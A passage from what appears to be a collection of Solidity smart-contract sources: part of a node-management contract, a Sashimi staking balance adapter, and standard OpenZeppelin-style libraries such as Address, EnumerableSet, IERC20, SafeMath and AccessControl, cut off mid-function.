indexOfNodes;\n\n                indexOfActiveNodesByAddress++;\n\n            }\n\n        }\n\n    }\n\n\n\n    /**\n\n     * @dev getActiveNodeIds - get array of indexes of Active Nodes\n\n     * @return activeNodeIds - array of indexes of Active Nodes\n\n     */\n\n    function getActiveNodeIds() external view returns (uint[] memory activeNodeIds) {\n\n        activeNodeIds = new uint[](numberOfActiveNodes);\n\n        uint indexOfActiveNodeIds = 0;\n\n        for (uint indexOfNodes = 0; indexOfNodes < nodes.length; indexOfNodes++) {\n\n            if (isNodeActive(indexOfNodes)) {\n\n                activeNodeIds[indexOfActiveNodeIds] = indexOfNodes;\n\n                indexOfActiveNodeIds++;\n\n            }\n\n        }\n\n    }\n\n\n\n    function getValidatorId(uint nodeIndex) external view returns (uint) {\n\n        require(nodeIndex < nodes.length, "Node does not exist");\n\n        return nodes[nodeIndex].validatorId;\n\n    }\n\n\n\n    function getNodeStatus(uint nodeIndex) external view returns (NodeStatus) {\n\n        return nodes[nodeIndex].status;\n\n    }\n\n\n\n    function getValidatorNodeIndexes(uint validatorId) external view returns (uint[] memory) {\n\n        ValidatorService validatorService = ValidatorService(contractManager.getContract("ValidatorService"));\n\n        require(validatorService.validatorExists(validatorId), "Validator with such ID does not exist");\n\n        return validatorToNodeIndexes[validatorId];\n\n    }\n\n\n\n    /**\n\n     * @dev constructor in Permissions approach\n\n     * @param contractsAddress needed in Permissions constructor\n\n    */\n\n    function initialize(address contractsAddress) public override initializer {\n\n        Permissions.initialize(contractsAddress);\n\n\n\n        numberOfActiveNodes = 0;\n\n        numberOfLeavingNodes = 0;\n\n        numberOfLeftNodes = 0;\n\n    }\n\n\n\n    /**\n\n     * @dev isNodeActive - checks if Node status Active\n\n     * @param nodeIndex - index of Node\n\n     * @return if Node status Active - true, else - false\n\n     */\n\n    function isNodeActive(uint nodeIndex) public view returns (bool) {\n\n        return nodes[nodeIndex].status == NodeStatus.Active;\n\n    }\n\n\n\n    /**\n\n     * @dev isNodeLeaving - checks if Node status Leaving\n\n     * @param nodeIndex - index of Node\n\n     * @return if Node status Leaving - true, else - false\n\n     */\n\n    function isNodeLeaving(uint nodeIndex) public view returns (bool) {\n\n        return nodes[nodeIndex].status == NodeStatus.Leaving;\n\n    }\n\n\n\n    function countNodesWithFreeSpace(uint8 freeSpace) public view returns (uint count) {\n\n        ConstantsHolder constantsHolder = ConstantsHolder(contractManager.getContract("ConstantsHolder"));\n\n        count = 0;\n\n        for (uint8 i = freeSpace; i <= constantsHolder.TOTAL_SPACE_ON_NODE(); ++i) {\n\n            count = count.add(spaceToNodes[i].length);\n\n        }\n\n    }\n\n\n\n    function _findNode(uint[] memory validatorNodeIndexes, uint nodeIndex) private pure returns (uint) {\n\n        uint i;\n\n        for (i = 0; i < validatorNodeIndexes.length; i++) {\n\n            if (validatorNodeIndexes[i] == nodeIndex) {\n\n                return i;\n\n            }\n\n        }\n\n        return validatorNodeIndexes.length;\n\n    }\n\n\n\n    function _moveNodeToNewSpaceMap(uint nodeIndex, uint8 newSpace) private {\n\n        uint8 previousSpace = spaceOfNodes[nodeIndex].freeSpace;\n\n        uint indexInArray = spaceOfNodes[nodeIndex].indexInSpaceMap;\n\n        if (indexInArray < spaceToNodes[previousSpace].length.sub(1)) {\n\n            uint shiftedIndex = spaceToNodes[previousSpace][spaceToNodes[previousSpace].length.sub(1)];\n\n            spaceToNodes[previousSpace][indexInArray] = shiftedIndex;\n\n            spaceOfNodes[shiftedIndex].indexInSpaceMap = indexInArray;\n\n            spaceToNodes[previousSpace].pop();\n\n        } else {\n\n            spaceToNodes[previousSpace].pop();\n\n        }\n\n        spaceToNodes[newSpace].push(nodeIndex);\n\n        spaceOfNodes[nodeIndex].freeSpace = newSpace;\n\n        spaceOfNodes[nodeIndex].indexInSpaceMap = spaceToNodes[newSpace].length.sub(1);\n\n    }\n\n\n\n    /**\n\n     * @dev _setNodeLeft - set Node Left\n\n     * function could be run only by Nodes\n\n     * @param nodeIndex - index of Node\n\n     */\n\n    function _setNodeLeft(uint nodeIndex) private {\n\n        nodesIPCheck[nodes[nodeIndex].ip] = false;\n\n        nodesNameCheck[keccak256(abi.encodePacked(nodes[nodeIndex].name))] = false;\n\n        delete nodesNameToIndex[keccak256(abi.encodePacked(nodes[nodeIndex].name))];\n\n        if (nodes[nodeIndex].status == NodeStatus.Active) {\n\n            numberOfActiveNodes--;\n\n        } else {\n\n            numberOfLeavingNodes--;\n\n        }\n\n        nodes[nodeIndex].status = NodeStatus.Left;\n\n        numberOfLeftNodes++;\n\n    }\n\n\n\n    /**\n\n     * @dev _setNodeLeaving - set Node Leaving\n\n     * function could be run only by Nodes\n\n     * @param nodeIndex - index of Node\n\n     */\n\n    function _setNodeLeaving(uint nodeIndex) private {\n\n        nodes[nodeIndex].status = NodeStatus.Leaving;\n\n        numberOfActiveNodes--;\n\n        numberOfLeavingNodes++;\n\n    }\n\n\n\n    /**\n\n     * @dev _addNode - adds Node to array\n\n     * function could be run only by executor\n\n     * @param from - owner of Node\n\n     * @param name - Node name\n\n     * @param ip - Node ip\n\n     * @param publicIP - Node public ip\n\n     * @param port - Node public port\n\n     * @param publicKey - Ethereum public key\n\n     * @return nodeIndex Index of Node\n\n     */\n\n    function _addNode(\n\n        address from,\n\n        string memory name,\n\n        bytes4 ip,\n\n        bytes4 publicIP,\n\n        uint16 port,\n\n        bytes32[2] memory publicKey,\n\n        uint validatorId\n\n    )\n\n        private\n\n        returns (uint nodeIndex)\n\n    {\n\n        ConstantsHolder constantsHolder = ConstantsHolder(contractManager.getContract("ConstantsHolder"));\n\n        nodes.push(Node({\n\n            name: name,\n\n            ip: ip,\n\n            publicIP: publicIP,\n\n            port: port,\n\n            //owner: from,\n\n            publicKey: publicKey,\n\n            startBlock: block.number,\n\n            lastRewardDate: block.timestamp,\n\n            finishTime: 0,\n\n            status: NodeStatus.Active,\n\n            validatorId: validatorId\n\n        }));\n\n        nodeIndex = nodes.length.sub(1);\n\n        validatorToNodeIndexes[validatorId].push(nodeIndex);\n\n        bytes32 nodeId = keccak256(abi.encodePacked(name));\n\n        nodesIPCheck[ip] = true;\n\n        nodesNameCheck[nodeId] = true;\n\n        nodesNameToIndex[nodeId] = nodeIndex;\n\n        nodeIndexes[from].isNodeExist[nodeIndex] = true;\n\n        nodeIndexes[from].numberOfNodes++;\n\n        spaceOfNodes.push(SpaceManaging({\n\n            freeSpace: constantsHolder.TOTAL_SPACE_ON_NODE(),\n\n            indexInSpaceMap: spaceToNodes[constantsHolder.TOTAL_SPACE_ON_NODE()].length\n\n        }));\n\n        spaceToNodes[constantsHolder.TOTAL_SPACE_ON_NODE()].push(nodeIndex);\n\n        numberOfActiveNodes++;\n\n    }\n\n\n\n    function _deleteNode(uint nodeIndex) private {\n\n        uint8 space = spaceOfNodes[nodeIndex].freeSpace;\n\n        uint indexInArray = spaceOfNodes[nodeIndex].indexInSpaceMap;\n\n        if (indexInArray < spaceToNodes[space].length.sub(1)) {\n\n            uint shiftedIndex = spaceToNodes[space][spaceToNodes[space].length.sub(1)];\n\n            spaceToNodes[space][indexInArray] = shiftedIndex;\n\n            spaceOfNodes[shiftedIndex].indexInSpaceMap = indexInArray;\n\n            spaceToNodes[space].pop();\n\n        } else {\n\n            spaceToNodes[space].pop();\n\n        }\n\n        delete spaceOfNodes[nodeIndex].freeSpace;\n\n        delete spaceOfNodes[nodeIndex].indexInSpaceMap;\n\n    }\n\n\n\n}\n', 'pragma solidity 0.6.5;\npragma experimental ABIEncoderV2;\n\nstruct UserInfo {\n\n    uint256 amount;\n\n    uint256 rewardDebt;\n\n}\n\nstruct PoolInfo {\n\n    address lpToken;\n\n    uint256 allocPoint;\n\n    uint256 lastRewardBlock;\n\n    uint256 accSushiPerShare;\n\n}\n\ninterface ProtocolAdapter {\n\n\n\n    /**\n\n     * @dev MUST return "Asset" or "Debt".\n\n     * SHOULD be implemented by the public constant state variable.\n\n     */\n\n    function adapterType() external pure returns (string memory);\n\n\n\n    /**\n\n     * @dev MUST return token type (default is "ERC20").\n\n     * SHOULD be implemented by the public constant state variable.\n\n     */\n\n    function tokenType() external pure returns (string memory);\n\n\n\n    /**\n\n     * @dev MUST return amount of the given token locked on the protocol by the given account.\n\n     */\n\n    function getBalance(address token, address account) external view returns (uint256);\n\n}\n\ninterface MasterChef {\n\n    function poolLength() external view returns (uint256);\n\n    function poolInfo(uint256) external view returns (PoolInfo memory);\n\n    function userInfo(uint256, address) external view returns (UserInfo memory);\n\n    function pendingSashimi(uint256, address) external view returns (uint256);\n\n}\n\ncontract SashimiStakingAdapter is ProtocolAdapter {\n\n\n\n    string public constant override adapterType = "Asset";\n\n\n\n    string public constant override tokenType = "ERC20";\n\n\n\n    address internal constant SASHIMI = 0xC28E27870558cF22ADD83540d2126da2e4b464c2;\n\n    address internal constant MASTER_CHEF = 0x1DaeD74ed1dD7C9Dabbe51361ac90A69d851234D;\n\n\n\n    /**\n\n     * @return Amount of SASHIMI rewards / staked tokens for a given account.\n\n     * @dev Implementation of ProtocolAdapter interface function.\n\n     */\n\n    function getBalance(address token, address account) external view override returns (uint256) {\n\n        uint256 length = MasterChef(MASTER_CHEF).poolLength();\n\n\n\n        if (token == SASHIMI) {\n\n            uint256 totalRewards = 0;\n\n\n\n            for(uint256 i = 0; i < length; i++) {\n\n                totalRewards += MasterChef(MASTER_CHEF).pendingSashimi(i, account);\n\n            }\n\n\n\n            return totalRewards;\n\n        } else {\n\n            for(uint256 i = 0; i < length; i++) {\n\n                UserInfo memory user = MasterChef(MASTER_CHEF).userInfo(i, account);\n\n                PoolInfo memory pool = MasterChef(MASTER_CHEF).poolInfo(i);\n\n\n\n                if (pool.lpToken == token) {\n\n                    return user.amount;\n\n                }\n\n            }\n\n\n\n            return 0;\n\n        }\n\n    }\n\n}\n', 'pragma solidity 0.6.6;\n\nlibrary Address {\n\n    /**\n\n     * @dev Returns true if `account` is a contract.\n\n     *\n\n     * [IMPORTANT]\n\n     * ====\n\n     * It is unsafe to assume that an address for which this function returns\n\n     * false is an externally-owned account (EOA) and not a contract.\n\n     *\n\n     * Among others, `isContract` will return false for the following\n\n     * types of addresses:\n\n     *\n\n     *  - an externally-owned account\n\n     *  - a contract in construction\n\n     *  - an address where a contract will be created\n\n     *  - an address where a contract lived, but was destroyed\n\n     * ====\n\n     */\n\n    function isContract(address account) internal view returns (bool) {\n\n        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts\n\n        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned\n\n        // for accounts without code, i.e. `keccak256(\'\')`\n\n        bytes32 codehash;\n\n        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\n\n        // solhint-disable-next-line no-inline-assembly\n\n        assembly { codehash := extcodehash(account) }\n\n        return (codehash != accountHash && codehash != 0x0);\n\n    }\n\n\n\n    /**\n\n     * @dev Replacement for Solidity\'s `transfer`: sends `amount` wei to\n\n     * `recipient`, forwarding all available gas and reverting on errors.\n\n     *\n\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n\n     * imposed by `transfer`, making them unable to receive funds via\n\n     * `transfer`. {sendValue} removes this limitation.\n\n     *\n\n     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n\n     *\n\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n\n     * taken to not create reentrancy vulnerabilities. Consider using\n\n     * {ReentrancyGuard} or the\n\n     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n\n     */\n\n    function sendValue(address payable recipient, uint256 amount) internal {\n\n        require(address(this).balance >= amount, "Address: insufficient balance");\n\n\n\n        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value\n\n        (bool success, ) = recipient.call{ value: amount }("");\n\n        require(success, "Address: unable to send value, recipient may have reverted");\n\n    }\n\n\n\n    /**\n\n     * @dev Performs a Solidity function call using a low level `call`. A\n\n     * plain`call` is an unsafe replacement for a function call: use this\n\n     * function instead.\n\n     *\n\n     * If `target` reverts with a revert reason, it is bubbled up by this\n\n     * function (like regular Solidity function calls).\n\n     *\n\n     * Returns the raw returned data. To convert to the expected return value,\n\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - `target` must be a contract.\n\n     * - calling `target` with `data` must not revert.\n\n     *\n\n     * _Available since v3.1._\n\n     */\n\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\n\n      return functionCall(target, data, "Address: low-level call failed");\n\n    }\n\n\n\n    /**\n\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with\n\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n\n     *\n\n     * _Available since v3.1._\n\n     */\n\n    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\n\n        return _functionCallWithValue(target, data, 0, errorMessage);\n\n    }\n\n\n\n    /**\n\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n\n     * but also transferring `value` wei to `target`.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - the calling contract must have an ETH balance of at least `value`.\n\n     * - the called Solidity function must be `payable`.\n\n     *\n\n     * _Available since v3.1._\n\n     */\n\n    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\n\n        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");\n\n    }\n\n\n\n    /**\n\n     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but\n\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n\n     *\n\n     * _Available since v3.1._\n\n     */\n\n    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\n\n        require(address(this).balance >= value, "Address: insufficient balance for call");\n\n        return _functionCallWithValue(target, data, value, errorMessage);\n\n    }\n\n\n\n    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {\n\n        require(isContract(target), "Address: call to non-contract");\n\n\n\n        // solhint-disable-next-line avoid-low-level-calls\n\n        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);\n\n        if (success) {\n\n            return returndata;\n\n        } else {\n\n            // Look for revert reason and bubble it up if present\n\n            if (returndata.length > 0) {\n\n                // The easiest way to bubble the revert reason is using memory via assembly\n\n\n\n                // solhint-disable-next-line no-inline-assembly\n\n                assembly {\n\n                    let returndata_size := mload(returndata)\n\n                    revert(add(32, returndata), returndata_size)\n\n                }\n\n            } else {\n\n                revert(errorMessage);\n\n            }\n\n        }\n\n    }\n\n}\n\nabstract contract Context {\n\n    function _msgSender() internal view virtual returns (address payable) {\n\n        return msg.sender;\n\n    }\n\n\n\n    function _msgData() internal view virtual returns (bytes memory) {\n\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n\n        return msg.data;\n\n    }\n\n}\n\nlibrary EnumerableSet {\n\n    // To implement this library for multiple types with as little code\n\n    // repetition as possible, we write it in terms of a generic Set type with\n\n    // bytes32 values.\n\n    // The Set implementation uses private functions, and user-facing\n\n    // implementations (such as AddressSet) are just wrappers around the\n\n    // underlying Set.\n\n    // This means that we can only create new EnumerableSets for types that fit\n\n    // in bytes32.\n\n\n\n    struct Set {\n\n        // Storage of set values\n\n        bytes32[] _values;\n\n\n\n        // Position of the value in the `values` array, plus 1 because index 0\n\n        // means a value is not in the set.\n\n        mapping (bytes32 => uint256) _indexes;\n\n    }\n\n\n\n    /**\n\n     * @dev Add a value to a set. O(1).\n\n     *\n\n     * Returns true if the value was added to the set, that is if it was not\n\n     * already present.\n\n     */\n\n    function _add(Set storage set, bytes32 value) private returns (bool) {\n\n        if (!_contains(set, value)) {\n\n            set._values.push(value);\n\n            // The value is stored at length-1, but we add 1 to all indexes\n\n            // and use 0 as a sentinel value\n\n            set._indexes[value] = set._values.length;\n\n            return true;\n\n        } else {\n\n            return false;\n\n        }\n\n    }\n\n\n\n    /**\n\n     * @dev Removes a value from a set. O(1).\n\n     *\n\n     * Returns true if the value was removed from the set, that is if it was\n\n     * present.\n\n     */\n\n    function _remove(Set storage set, bytes32 value) private returns (bool) {\n\n        // We read and store the value\'s index to prevent multiple reads from the same storage slot\n\n        uint256 valueIndex = set._indexes[value];\n\n\n\n        if (valueIndex != 0) { // Equivalent to contains(set, value)\n\n            // To delete an element from the _values array in O(1), we swap the element to delete with the last one in\n\n            // the array, and then remove the last element (sometimes called as \'swap and pop\').\n\n            // This modifies the order of the array, as noted in {at}.\n\n\n\n            uint256 toDeleteIndex = valueIndex - 1;\n\n            uint256 lastIndex = set._values.length - 1;\n\n\n\n            // When the value to delete is the last one, the swap operation is unnecessary. However, since this occurs\n\n            // so rarely, we still do the swap anyway to avoid the gas cost of adding an \'if\' statement.\n\n\n\n            bytes32 lastvalue = set._values[lastIndex];\n\n\n\n            // Move the last value to the index where the value to delete is\n\n            set._values[toDeleteIndex] = lastvalue;\n\n            // Update the index for the moved value\n\n            set._indexes[lastvalue] = toDeleteIndex + 1; // All indexes are 1-based\n\n\n\n            // Delete the slot where the moved value was stored\n\n            set._values.pop();\n\n\n\n            // Delete the index for the deleted slot\n\n            delete set._indexes[value];\n\n\n\n            return true;\n\n        } else {\n\n            return false;\n\n        }\n\n    }\n\n\n\n    /**\n\n     * @dev Returns true if the value is in the set. O(1).\n\n     */\n\n    function _contains(Set storage set, bytes32 value) private view returns (bool) {\n\n        return set._indexes[value] != 0;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the number of values on the set. O(1).\n\n     */\n\n    function _length(Set storage set) private view returns (uint256) {\n\n        return set._values.length;\n\n    }\n\n\n\n   /**\n\n    * @dev Returns the value stored at position `index` in the set. O(1).\n\n    *\n\n    * Note that there are no guarantees on the ordering of values inside the\n\n    * array, and it may change when more values are added or removed.\n\n    *\n\n    * Requirements:\n\n    *\n\n    * - `index` must be strictly less than {length}.\n\n    */\n\n    function _at(Set storage set, uint256 index) private view returns (bytes32) {\n\n        require(set._values.length > index, "EnumerableSet: index out of bounds");\n\n        return set._values[index];\n\n    }\n\n\n\n    // AddressSet\n\n\n\n    struct AddressSet {\n\n        Set _inner;\n\n    }\n\n\n\n    /**\n\n     * @dev Add a value to a set. O(1).\n\n     *\n\n     * Returns true if the value was added to the set, that is if it was not\n\n     * already present.\n\n     */\n\n    function add(AddressSet storage set, address value) internal returns (bool) {\n\n        return _add(set._inner, bytes32(uint256(value)));\n\n    }\n\n\n\n    /**\n\n     * @dev Removes a value from a set. O(1).\n\n     *\n\n     * Returns true if the value was removed from the set, that is if it was\n\n     * present.\n\n     */\n\n    function remove(AddressSet storage set, address value) internal returns (bool) {\n\n        return _remove(set._inner, bytes32(uint256(value)));\n\n    }\n\n\n\n    /**\n\n     * @dev Returns true if the value is in the set. O(1).\n\n     */\n\n    function contains(AddressSet storage set, address value) internal view returns (bool) {\n\n        return _contains(set._inner, bytes32(uint256(value)));\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the number of values in the set. O(1).\n\n     */\n\n    function length(AddressSet storage set) internal view returns (uint256) {\n\n        return _length(set._inner);\n\n    }\n\n\n\n   /**\n\n    * @dev Returns the value stored at position `index` in the set. O(1).\n\n    *\n\n    * Note that there are no guarantees on the ordering of values inside the\n\n    * array, and it may change when more values are added or removed.\n\n    *\n\n    * Requirements:\n\n    *\n\n    * - `index` must be strictly less than {length}.\n\n    */\n\n    function at(AddressSet storage set, uint256 index) internal view returns (address) {\n\n        return address(uint256(_at(set._inner, index)));\n\n    }\n\n\n\n\n\n    // UintSet\n\n\n\n    struct UintSet {\n\n        Set _inner;\n\n    }\n\n\n\n    /**\n\n     * @dev Add a value to a set. O(1).\n\n     *\n\n     * Returns true if the value was added to the set, that is if it was not\n\n     * already present.\n\n     */\n\n    function add(UintSet storage set, uint256 value) internal returns (bool) {\n\n        return _add(set._inner, bytes32(value));\n\n    }\n\n\n\n    /**\n\n     * @dev Removes a value from a set. O(1).\n\n     *\n\n     * Returns true if the value was removed from the set, that is if it was\n\n     * present.\n\n     */\n\n    function remove(UintSet storage set, uint256 value) internal returns (bool) {\n\n        return _remove(set._inner, bytes32(value));\n\n    }\n\n\n\n    /**\n\n     * @dev Returns true if the value is in the set. O(1).\n\n     */\n\n    function contains(UintSet storage set, uint256 value) internal view returns (bool) {\n\n        return _contains(set._inner, bytes32(value));\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the number of values on the set. O(1).\n\n     */\n\n    function length(UintSet storage set) internal view returns (uint256) {\n\n        return _length(set._inner);\n\n    }\n\n\n\n   /**\n\n    * @dev Returns the value stored at position `index` in the set. O(1).\n\n    *\n\n    * Note that there are no guarantees on the ordering of values inside the\n\n    * array, and it may change when more values are added or removed.\n\n    *\n\n    * Requirements:\n\n    *\n\n    * - `index` must be strictly less than {length}.\n\n    */\n\n    function at(UintSet storage set, uint256 index) internal view returns (uint256) {\n\n        return uint256(_at(set._inner, index));\n\n    }\n\n}\n\ninterface IERC20 {\n\n    /**\n\n     * @dev Returns the amount of tokens in existence.\n\n     */\n\n    function totalSupply() external view returns (uint256);\n\n\n\n    /**\n\n     * @dev Returns the amount of tokens owned by `account`.\n\n     */\n\n    function balanceOf(address account) external view returns (uint256);\n\n\n\n    /**\n\n     * @dev Moves `amount` tokens from the caller\'s account to `recipient`.\n\n     *\n\n     * Returns a boolean value indicating whether the operation succeeded.\n\n     *\n\n     * Emits a {Transfer} event.\n\n     */\n\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n\n\n    /**\n\n     * @dev Returns the remaining number of tokens that `spender` will be\n\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n\n     * zero by default.\n\n     *\n\n     * This value changes when {approve} or {transferFrom} are called.\n\n     */\n\n    function allowance(address owner, address spender) external view returns (uint256);\n\n\n\n    /**\n\n     * @dev Sets `amount` as the allowance of `spender` over the caller\'s tokens.\n\n     *\n\n     * Returns a boolean value indicating whether the operation succeeded.\n\n     *\n\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n\n     * that someone may use both the old and the new allowance by unfortunate\n\n     * transaction ordering. One possible solution to mitigate this race\n\n     * condition is to first reduce the spender\'s allowance to 0 and set the\n\n     * desired value afterwards:\n\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n\n     *\n\n     * Emits an {Approval} event.\n\n     */\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n\n\n    /**\n\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n\n     * allowance mechanism. `amount` is then deducted from the caller\'s\n\n     * allowance.\n\n     *\n\n     * Returns a boolean value indicating whether the operation succeeded.\n\n     *\n\n     * Emits a {Transfer} event.\n\n     */\n\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n\n\n    /**\n\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n\n     * another (`to`).\n\n     *\n\n     * Note that `value` may be zero.\n\n     */\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n\n\n    /**\n\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n\n     * a call to {approve}. `value` is the new allowance.\n\n     */\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n}\n\ncontract Migrations {\n\n  address public owner;\n\n  uint public last_completed_migration;\n\n\n\n  modifier restricted() {\n\n    if (msg.sender == owner) _;\n\n  }\n\n\n\n  constructor() public {\n\n    owner = msg.sender;\n\n  }\n\n\n\n  function setCompleted(uint completed) public restricted {\n\n    last_completed_migration = completed;\n\n  }\n\n}\n\nlibrary SafeMath {\n\n    /**\n\n     * @dev Returns the addition of two unsigned integers, reverting on\n\n     * overflow.\n\n     *\n\n     * Counterpart to Solidity\'s `+` operator.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - Addition cannot overflow.\n\n     */\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n\n        uint256 c = a + b;\n\n        require(c >= a, "SafeMath: addition overflow");\n\n\n\n        return c;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n\n     * overflow (when the result is negative).\n\n     *\n\n     * Counterpart to Solidity\'s `-` operator.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - Subtraction cannot overflow.\n\n     */\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n\n        return sub(a, b, "SafeMath: subtraction overflow");\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n\n     * overflow (when the result is negative).\n\n     *\n\n     * Counterpart to Solidity\'s `-` operator.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - Subtraction cannot overflow.\n\n     */\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n\n        require(b <= a, errorMessage);\n\n        uint256 c = a - b;\n\n\n\n        return c;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n\n     * overflow.\n\n     *\n\n     * Counterpart to Solidity\'s `*` operator.\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - Multiplication cannot overflow.\n\n     */\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n\n        // Gas optimization: this is cheaper than requiring \'a\' not being zero, but the\n\n        // benefit is lost if \'b\' is also tested.\n\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n\n        if (a == 0) {\n\n            return 0;\n\n        }\n\n\n\n        uint256 c = a * b;\n\n        require(c / a == b, "SafeMath: multiplication overflow");\n\n\n\n        return c;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the integer division of two unsigned integers. Reverts on\n\n     * division by zero. The result is rounded towards zero.\n\n     *\n\n     * Counterpart to Solidity\'s `/` operator. Note: this function uses a\n\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n\n     * uses an invalid opcode to revert (consuming all remaining gas).\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - The divisor cannot be zero.\n\n     */\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n\n        return div(a, b, "SafeMath: division by zero");\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n\n     * division by zero. The result is rounded towards zero.\n\n     *\n\n     * Counterpart to Solidity\'s `/` operator. Note: this function uses a\n\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n\n     * uses an invalid opcode to revert (consuming all remaining gas).\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - The divisor cannot be zero.\n\n     */\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n\n        require(b > 0, errorMessage);\n\n        uint256 c = a / b;\n\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\n\n\n\n        return c;\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n\n     * Reverts when dividing by zero.\n\n     *\n\n     * Counterpart to Solidity\'s `%` operator. This function uses a `revert`\n\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n\n     * invalid opcode to revert (consuming all remaining gas).\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - The divisor cannot be zero.\n\n     */\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n\n        return mod(a, b, "SafeMath: modulo by zero");\n\n    }\n\n\n\n    /**\n\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n\n     * Reverts with custom message when dividing by zero.\n\n     *\n\n     * Counterpart to Solidity\'s `%` operator. This function uses a `revert`\n\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n\n     * invalid opcode to revert (consuming all remaining gas).\n\n     *\n\n     * Requirements:\n\n     *\n\n     * - The divisor cannot be zero.\n\n     */\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n\n        require(b != 0, errorMessage);\n\n        return a % b;\n\n    }\n\n}\n\nabstract contract AccessControl is Context {\n\n    using EnumerableSet for EnumerableSet.AddressSet;\n\n    using Address for address;\n\n\n\n    struct RoleData {\n\n        EnumerableSet.AddressSet members;\n\n        bytes32 adminRole;\n\n    }\n\n\n\n    mapping (bytes32 => RoleData) private _roles;\n\n\n\n    bytes32 public constant DEFAULT_ADMIN_ROLE = 0x00;\n\n\n\n    /**\n\n     * @dev Emitted when `newAdminRole` is set as ``role``\'s admin role, replacing `previousAdminRole`\n\n     *\n\n     * `DEFAULT_ADMIN_ROLE` is the starting admin for all roles, despite\n\n     * {RoleAdminChanged} not being emitted signaling this.\n\n     *\n\n     * _Available since v3.1._\n\n     */\n\n    event RoleAdminChanged(bytes32 indexed role, bytes32 indexed previousAdminRole, bytes32 indexed newAdminRole);\n\n\n\n    /**\n\n     * @dev Emitted when `account` is granted `role`.\n\n     *\n\n     * `sender` is the account that originated the contract call, an admin role\n\n     * bearer except when using {_setupRole}.\n\n     */\n\n    event RoleGranted(bytes32 indexed role, address indexed account, address indexed sender);\n\n\n\n    /**\n\n     * @dev Emitted when `account` is revoked `role`.\n\n     *\n\n     * `sender` is the account that originated the contract call:\n\n     *   - if using `revokeRole`, it is the admin role bearer\n\n     *   - if using `renounceRole`, it is the role bearer (i.e. `account`)\n\n     */\n\n    event RoleRevoked(bytes32 indexed role, address indexed account, address indexed sender);\n\n\n\n    /**\n\n     * @dev Returns `true` if `account` has been granted `role`.\n\n     */\n\n    function hasRole(bytes32 role, address account) public view returns (bool) {\n\n        return 